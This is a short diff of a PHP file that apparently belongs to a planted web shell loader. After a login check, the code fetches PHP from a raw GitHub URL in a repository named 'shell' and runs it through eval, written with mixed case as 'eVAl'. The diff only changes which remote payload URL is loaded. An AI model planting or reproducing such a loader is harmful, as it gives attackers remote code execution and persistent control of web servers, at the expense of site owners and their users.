@@ -33,7 +33,7 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/BjourkaTutorial/alfah/master/alfah');
+    $a = geturlsinfo('https://raw.githubusercontent.com/BjourkaTutorial/shell/main/alfah.txt');
     eVAl('?>' . $a);
 } else {
     // Display login form if not logged in
